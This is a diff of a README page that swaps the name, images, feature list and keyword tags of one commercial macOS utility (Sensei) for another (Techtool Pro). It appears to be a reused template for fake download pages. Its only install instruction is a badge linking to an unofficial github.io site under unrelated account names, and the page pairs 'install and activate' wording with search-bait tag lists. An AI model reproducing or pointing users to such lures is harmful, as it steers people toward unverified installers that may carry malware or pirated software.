@@ -1,12 +1,12 @@
-# Cindori AB Sensei  
+# Techtool Pro  
 
 <div align="center">
-  <img src="https://insmac.org/uploads/posts/2021-10/sensei.png" width="250"/>
+  <img src="https://micromat.com/wp-content/uploads/2020/10/Techtool-Pro-12-Icon.png" width="250"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/sensei)
+[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/techtool)
 
 </div>
 
@@ -15,21 +15,21 @@
 # Installation Instructions  
 
 1. Visit the website using the button above.  
-2. Follow the setup prompts to install and activate Cindori AB Sensei on your Mac.  
+2. Follow the setup prompts to install and activate Techtool Pro on your Mac.  
 
 ---
 
 <div align="center">
-  <img src="https://9to5mac.com/wp-content/uploads/sites/6/2020/01/sensei-mac-monitoring-performance-app-1.jpeg?quality=82&strip=all&w=1600" width="1080"/>
+  <img src="https://www.micromat.com/wp-content/uploads/2025/10/TTP21-Dark-and-Light-mode-1024x678.png" width="1080"/>
 </div>  
 <br>
 
 ## 💻 Overview  
 
-Cindori AB Sensei is a powerful macOS utility designed to provide deep insights into your system's health and performance.  
-It monitors CPU, GPU, RAM, and storage usage while offering actionable suggestions to enhance speed and efficiency.  
+Techtool Pro delivers an extensive toolkit for maintaining and repairing macOS systems.  
+It provides utilities for disk health checks, performance tuning, memory diagnostics, and data recovery.  
 
-The software integrates disk health diagnostics, system optimization tools, and real-time performance tracking in a clean, user-friendly interface. Sensei is ideal for Mac users who want to maintain peak performance and monitor hardware status effortlessly.  
+Perfect for both professionals and advanced users, Techtool Pro helps prevent system failures, optimize Mac performance, and recover critical files from damaged drives.  
 
 ---
 
@@ -37,14 +37,14 @@ The software integrates disk health diagnostics, system optimization tools, and 
 
 | Feature | Description |
 |----------|-------------|
-| 🖥 Real-Time System Monitoring | Keep track of CPU, GPU, memory, and disk usage continuously. |
-| 💾 Storage Health & Management | Evaluate disk condition and optimize storage space efficiently. |
-| ⚡ System Optimization | Identify bottlenecks and apply tweaks to boost performance. |
-| 🧠 Smart Recommendations | Receive insights and tips for maintaining optimal system health. |
-| 📊 Detailed Analytics | Generate visual reports of performance metrics and trends. |
-| 🔔 Alerts & Notifications | Get notified about potential issues or performance drops. |
-| 🖥 User-Friendly Interface | Clean, intuitive dashboards for easy navigation. |
-| 🔐 Secure & Private | Performs checks without compromising user privacy. |
+| 🛠 Disk Health & Repair | Scan and fix issues on internal and external drives. |
+| ⚡ System Performance Tools | Enhance Mac speed and responsiveness. |
+| 🧪 Memory Diagnostics | Identify and troubleshoot RAM issues efficiently. |
+| 🔄 Directory & Volume Rebuild | Restore damaged file structures. |
+| 📊 Benchmarking | Monitor CPU, GPU, and overall system performance. |
+| 🗄 File Recovery | Recover deleted or corrupted data safely. |
+| 🖥 macOS Theme Support | Compatible with Light and Dark modes. |
+| 🔧 Hardware Testing | Verify functionality of Mac components. |
 
 ---
 
@@ -52,14 +52,14 @@ The software integrates disk health diagnostics, system optimization tools, and 
 
 | Component | Specification |
 |------------|---------------|
-| Operating System | macOS 10.15 (Catalina) or later |
+| Operating System | macOS 10.14 (Mojave) or later |
 | Processor | Intel or Apple Silicon (M1/M2/M3) |
-| RAM | Minimum 4 GB |
-| Storage | 200 MB free disk space |
-| Internet | Needed for updates and cloud features |
+| RAM | 4 GB minimum |
+| Storage | 1 GB free disk space |
+| Internet | Required for activation and updates |
 
 ---
 
 ## 🏷 Tags  
 
-sensei • sensei mac • mac sensei • sensei for mac • sensei mac app • sensei macos • sensei app mac • sinsay master • cindori ab • cindori ab mac • cindori ab sensei • cindori ab sensei mac • s sensei • sensei master
+techtool pro • techtool • micromat • micromat techtool pro • tech tool pro • techtool software • techtool pro mac • micromat mac • techtool mac • techtool pro 16 • techtool pro 17 • apple tech tools • micromat com • tech tool computers • micromat techtool • tech tool download • tech tool pro mac • tech tool software download • techtool deluxe for mac • techtool pro 12 • techtool pro 12 download
